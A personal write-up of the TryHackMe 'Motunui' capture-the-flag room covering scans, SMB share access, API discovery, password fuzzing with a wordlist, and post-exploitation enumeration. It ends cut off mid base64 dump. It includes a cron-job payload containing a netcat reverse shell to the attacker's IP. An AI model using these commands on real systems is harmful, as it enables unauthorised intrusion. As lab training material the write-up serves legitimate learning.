<h1 align="center">Motunui</h1>
<p align="center">2025, October 8<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>520</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Hack the island of Motunui</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/e623fb7e-5ce9-4342-b578-d4f54167a477"><br>
Access it <a href="https://tryhackme.com/room/motunui">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/2b19678d-951c-4556-aa1d-6a4a65234c27"></p>


<h2>Task 1 . Motunui</h2>
<p>Deploy the machone and get root privileges.</p>

<p><em>Answer the questions below</em></p>


<br>
<br>
<h1 align="center">Port Scanning<a id='1'></a></h1>
<p align="center"><strong>6</strong> open ports</p>
<br>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.29              |
| `139`              |`SMB`                 |Samba smbd 3.X - 4.X             |
| `445`              |`SMB`                 |Samba smbd 4.7.6-Ubuntu          |
| `3000`             |`SSL/HTTP`            |Apache httpd 2.4.29              |
| `5000`             |`SSL/HTTP`            |Node.js                          |

</p></div><br>


```bash
:~/Motunui# nmap -sT -p- 22,xx.xxx.xxx.x
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3000/tcp open  ppp
5000/tcp open  upnp
```

```bash
:~/Motunui# nmap -sC -sV -Pn -p22,80,138,445,3000,5000 -T4 xx.xxx.xxx.x
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 174
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /nice%20ports%2C/Tri%6Eity.txt%2ebak</pre>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
5000/tcp open  ssl/http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: organizationName=Motunui/stateOrProvinceName=Motunui/countryName=GB
| Not valid before: 2020-08-03Txx:xx:xx
|_Not valid after:  2021-08-03Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
...
Host script results:
|_nbstat: NetBIOS name: MOTUNUI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: motunui
|   NetBIOS computer name: MOTUNUI\x00
|   Domain name: \x00
|   FQDN: motunui
|_  System time: 2025-10-08Txx:xx:xx6+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-08Txx:xx:xx
|_  start_date: N/A
```

<br>
<h1 align="center">Web Vulberability Scanning<a id='2'></a></h1>

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        80
+ Start Time:         2025-10-08 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5a9dc742b86d1 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-08 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x:3000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        3000
+ Start Time:         2025-10-08 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 24 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-08 xx:xx:xx (GMT1) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x:5000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        5000
---------------------------------------------------------------------------
+ SSL Info:        Subject: /C=GB/ST=Motunui/O=Motunui
                   Ciphers: ECDHE-RSA-AES128-GCM-SHA256
                   Issuer:  /C=GB/ST=Motunui/O=Motunui
+ Start Time:         2025-10-08 22:42:40 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/7 0xwLE3/i15JFnyb/djzORFdKW1qwM 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD
...
```

<br>
<h1 align="center">SMB Enumeration<a id='3'></a></h1>

```bash
:~/Motunui# enum4linux xx.xxx.xxx.x
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct  8 xx:xx:xx 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... xx.xxx.xxx.x
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on xx.xxx.xxx.x    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for xx.xxx.xxx.x    |
 ============================================ 
Looking up status of xx.xxx.xxx.x
	MOTUNUI         <00> -         B <ACTIVE>  Workstation Service
	MOTUNUI         <03> -         B <ACTIVE>  Messenger Service
	MOTUNUI         <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on xx.xxx.xxx.x    |
 ===================================== 
[+] Server xx.xxx.xxx.x allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for xx.xxx.xxx.x    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on xx.xxx.xxx.x    |
 ====================================== 
...
[+] Got OS info for xx.xxx.xxx.x from smbclient: 
[+] Got OS info for xx.xxx.xxx.x from srvinfo:
	MOTUNUI        Wk Sv PrQ Unx NT SNT motunui server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on xx.xxx.xxx.x    |
 ============================= 
...

 ========================================= 
|    Share Enumeration on xx.xxx.xxx.x    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on xx.xxx.xxx.x
//xx.xxx.xxx.x/print$	Mapping: DENIED, Listing: N/A
//xx.xxx.xxx.x/traces	Mapping: OK, Listing: OK
//xx.xxx.xxx.x/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for xx.xxx.xxx.x    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on xx.xxx.xxx.x    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on xx.xxx.xxx.x via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
...
[+] Enumerating users using SID S-1-5-21-2796028439-693928412-3159673858 and logon username '', password ''
...
S-1-5-21-2796028439-693928412-3159673858-501 MOTUNUI\nobody (Local User)
...
S-1-5-21-2796028439-693928412-3159673858-513 MOTUNUI\None (Domain Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\moana (Local User)
S-1-22-1-1001 Unix User\network (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
 ============================================= 
|    Getting printer info for xx.xxx.xxx.x    |
 ============================================= 
No printers returned.


enum4linux complete on Wed Oct  8 xx:xx:xx 2025
```

<br>
<br>
<br>

```bash
:~/Motunui# smbclient -L xx.xxx.xxx.x -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<p align="center">ticket_6746.pcapng</p>

```bash
:~/Motunui# smbmap -H xx.xxx.xxx.x -u guest -p ' '
[+] Finding open SMB ports....
[+] Guest SMB session established on xx.xxx.xxx.x...
[+] IP: xx.xxx.xxx.x:445	Name: xx.xxx.xxx.x                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	.                                                  
	dr--r--r--                0 Thu Jul  9 04:48:54 2020	.
	dr--r--r--                0 Thu Jul  9 04:48:27 2020	..
	dr--r--r--                0 Thu Jul  9 04:50:12 2020	moana
	dr--r--r--                0 Mon Aug  3 17:22:03 2020	maui
	dr--r--r--                0 Thu Jul  9 04:50:40 2020	tui
	traces                                            	READ ONLY	Network shared files
	IPC$                                              	NO ACCESS	IPC Service (motunui server (Samba, Ubuntu))
```

```bash
:~/Motunui# smbclient //xx.xxx.xxx.x/traces -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 04:48:54 2020
  ..                                  D        0  Thu Jul  9 04:48:27 2020
  moana                               D        0  Thu Jul  9 04:50:12 2020
  maui                                D        0  Mon Aug  3 17:22:03 2020
  tui                                 D        0  Thu Jul  9 04:50:40 2020

		19475088 blocks of size 1024. 11271588 blocks available
smb: \> cd moana
smb: \moana\> ls
  .                                   D        0  Thu Jul  9 04:50:12 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_64947.pcapng                 N        0  Tue Jul  7 17:51:43 2020
  ticket_31762.pcapng                 N        0  Tue Jul  7 17:51:28 2020

		19475088 blocks of size 1024. 11271588 blocks available
...
smb: \> cd maui
smb: \maui\> ls 
  .                                   D        0  Mon Aug  3 17:22:03 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_6746.pcapng                  N    79296  Mon Aug  3 17:21:16 2020

		19475088 blocks of size 1024. 11271588 blocks available
smb: \maui\> get ticket_6746.pcapng
getting file \maui\ticket_6746.pcapng of size 79296 as ticket_6746.pcapng (38716.9 KiloBytes/sec) (average 25812.5 KiloBytes/sec)
smb: \maui\> 
...
smb: \tui\> ls
  .                                   D        0  Thu Jul  9 04:50:40 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_7876.pcapng                  N        0  Tue Jul  7 17:52:24 2020
  ticket_1325.pcapng                  N        0  Tue Jul  7 17:52:30 2020

		19475088 blocks of size 1024. 11271588 blocks available
```


<br>
<h1 align="center">Traffic Inspection<a id='4'></a></h1>
<p>
  
- dashboard.png<br>
- Client Hello www.jake-ruston.com<br>
- Server Hello, Change Cipher<br>
- A    0x4f1e 0x079d 0x0a06 0x8653<br>
- AAAA 0x6d1c 0xe69f 0x9e04 0x8d51</p> 

```bash
GET /dashboard.png HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: xxx.xxx.xxx.xxx:8000
Connection: Keep-Alive
```

<br>
<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
<br>
<p align="center">80</p>

<img width="1041" height="194" alt="image" src="https://github.com/user-attachments/assets/9bc8a1ba-71ad-493c-9d31-3b5a8ded00da" />

<br>
<br>
<br>

<img width="1164" height="198" alt="image" src="https://github.com/user-attachments/assets/5c1b3184-c41a-429d-82d7-ff2ecd9bdc71" />

<br>
<br>
<br>

<img width="1210" height="393" alt="image" src="https://github.com/user-attachments/assets/d55f7cb5-e1a8-4e44-ab75-f53888fd39e0" />

<br>
<br>
<br>

<p align="center">dashboad.png:<br>d3v3lopm3nt.motonui.thm<br>The pages included on this virtual host are solely for developers of Motunui. Please ensure you have authorisation  to ve viewing this.</p>

<img width="1223" height="196" alt="image" src="https://github.com/user-attachments/assets/02dffd6c-d835-4591-a7d5-c0b5aac02cc8" />

<br>
<br>
<br>
<h1 align="center">Directory and File Enumeration<a id='6'></a></h1>
<br>
<p align="center">d3v3lopm3nt.motunui.thm<br>/index.php  .  /docs</p>
  
```bash
:~/Motunui# gobuster dir -u http://d3v3lopm3nt.motunui.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
...
/index.php            (Status: 200) [Size: 248]
/docs                 (Status: 301) [Size: 333] [--> http://d3v3lopm3nt.motunui.thm/docs/]
...
Progress: 654825 / 654828 (100.00%)
```

<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/<br>/README.md</p>

```bash
:~/Motunui# gobuster dir -u http://d3v3lopm3nt.motunui.thm/docs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x md,bak,php
...
/index.php            (Status: 302) [Size: 0] [--> README.md]
/README.md            (Status: 200) [Size: 230]
/CHANGELOG.md         (Status: 200) [Size: 0]
```

<br>
<h1 align="center">Web Interface Inspection<a id='7'></a></h1>
<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/README.md</p>

<img width="1270" height="267" alt="image" src="https://github.com/user-attachments/assets/681e88bc-23d8-4b39-85ea-fdd5fdd594be" />

<br>
<br>
<br<

```bash
# Documentation for the in-development API

##### [Changelog](CHANGELOG.md) | [Issues](ISSUES.md)

Please do not distribute this documentation outside of the development team.

## Routes
Find all of the routes [here](ROUTES.md).
```

<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/ROUTES.md<br>api.motonui.thm:3000/v2/<br>POST /login  username  password  hash<br>POST /jobs hash</p>

```bash
# Routes

The base URL for the api is `api.motunui.thm:3000/v2/`.

### `POST /login`
Returns the hash for the specified user to be used for authorisation.
#### Parameters
- `username`
- `password`
#### Response (200)
```js
{
	"hash": String()
}

#### Response (401)
```js
{
	"error": "invalid credentials"
}


### ð\u0178\u201d `GET /jobs`
Returns all the cron jobs running as the current user.
#### Parameters
- `hash`
#### Response (200)
```js
{
	"jobs": Array()
}

#### Response (403)
```js
{
	"error": "you are unauthorised to view this resource"
}


### ð\u0178\u201d `POST /jobs`
Creates a new cron job running as the current user.
#### Parameters
- `hash`
#### Response (201)
```js
{
	"job": String()
}

#### Response (401)
```js
{
	"error": "you are unauthorised to view this resource"
}
```

<br>
<h1 align="center">Static Host Mapping<a id='8'></a></h1>

```bash
xx.xxx.xxx.x d3v3lopm3nt.motunui.thm
```

<img width="1275" height="765" alt="image" src="https://github.com/user-attachments/assets/f428e4b5-db6e-44ac-bfa4-926ce29f2e34" />

<br>
<br>
<br>

```bash
xx.xxx.xxx.x d3v3lopm3nt.motunui.thm api.motonui.thm
```

<br>
<h1 align="center">Web Interface Inspection<a id='9'></a></h1>
<p align="center">api.motonui.thm:3000/v2/login</p>

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v2/login
{"error":"method not allowed"}
```

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v1/login
{"message":"please get maui to update these routes"}
```

```bash
:~/Motunui# curl -X POST http://api.motunui.thm:3000/v2/login -d '{"username":"maui","password":"password"}'
{"error":"invalid credentials"}
```

<p align="center">maui:island</p>

```bash
:~/Motunui# ffuf -u http://api.motunui.thm:3000/v2/login -w /usr/share/wordlists/rockyou.txt -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -fs 31
...
island                  [Status: 200, Size: 19, Words: 1, Lines: 1]
```

<img width="1242" height="502" alt="image" src="https://github.com/user-attachments/assets/f13ac44f-bede-4943-a48d-aee5c7a0a2b3" />

<br>
<br>
<br>

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v2/login -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"island"}'
```

<p align="center">{"hash":"--------"}</p>

<img width="1351" height="120" alt="image" src="https://github.com/user-attachments/assets/0ee70357-156c-4cd0-b84f-72d2c0c6290c" />

<br>
<br>
<br>

```bash
:~/Motunui# curl -v http://api.motunui.thm:3000/v2/jobs -X GET -H 'Content-Type: application/json' -d '{"hash":"--------"}'
```

<img width="1325" height="106" alt="image" src="https://github.com/user-attachments/assets/ebd0cee6-4de0-4cff-9ab9-3c429837c6d7" />

<br>
<br>
<br>

<img width="836" height="262" alt="image" src="https://github.com/user-attachments/assets/e6500bda-600b-4ae6-b479-b9cfd8edc153" />

<br>
<br>
<br>

```bash
POST /v2/jobs HTTP/1.1
Host: api.motunui.thm:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded

{
  "hash": "--------",
	"job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xx.xxx 9001 >/tmp/f"
}
```

<img width="1142" height="423" alt="image" src="https://github.com/user-attachments/assets/9b03b563-5b31-4ce7-9d54-f22496163651" />

<br>
<br>
<br>

<img width="843" height="291" alt="image" src="https://github.com/user-attachments/assets/83e5ed0a-c842-442a-9674-8495dc3eceed" />

<br>
<br>
<br>

<img width="1330" height="400" alt="image" src="https://github.com/user-attachments/assets/9e04fc28-50fe-4205-902e-82923558439b" />

<br>
<br>
<br>

```bash
www-data@motunui:/home$ ls
moana  network
```

```bash
www-data@motunui:/home/moana$ cat read_me
I know you've been on vacation and the last thing you want is me nagging you.

But will you please consider not using the same password for all services? It puts us all at risk.

I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
```

```bash
www-data@motunui:/home/moana$ cat user.txt
cat: user.txt: Permission denied
```

```bash
www-data@motunui:/home/network/traces$ ls -lah
total 20K
drwxrwxr-x 5 network network 4.0K Jul  9  2020 .
drwxr-xr-x 3 network network 4.0K Jul  9  2020 ..
drwxrwxr-x 2 network network 4.0K Aug  3  2020 maui
drwxrwxr-x 2 network network 4.0K Jul  9  2020 moana
drwxrwxr-x 2 network network 4.0K Jul  9  2020 tui
```

```bash
www-data@motunui:/home$ find / -type f -name '*.pkt' -ls 2>/dev/null
   926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt
```

```bash
www-data@motunui:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       motunui dev.motunui.thm api.motunui.thm
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
www-data@motunui:/etc$ python3 -m http.server
```

```bash
:~/Motunui# curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 48875  100 48875    0     0   215k      0 --:--:-- --:--:-- --:--:--  215k
```



```bash
www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
```


<img width="1150" height="455" alt="image" src="https://github.com/user-attachments/assets/de88c9d6-b8ab-4f93-8e62-e7cde4136b49" />


```bash
[!] ret010 Cron tasks writable by user..................................... yes!
---
/var/spool/cron/crontabs
---
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/crontab:*  *    * * *   www-data	/usr/bin/crontab /var/spool/cron/crontabs/www-data
/etc/cron.d/popularity-contest:SHELL=/bin/sh
/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:23 10 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
/etc/cron.d/certbot:SHELL=/bin/sh
/etc/cron.d/certbot:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/certbot:0 */12 * * * root test -x /usr/bin/certbot -a \! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew
/etc/cron.d/php:09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/cache/apache2/mod_cache_disk
/var/crash
/var/crash/.
/var/spool/cron/crontabs/www-data
```


```bash
www-data@motunui:/etc$ file network.pkt
network.pkt: data
```


```bash
www-data@motunui:/$ cat /etc/network.pkt | base64 -w0
echo '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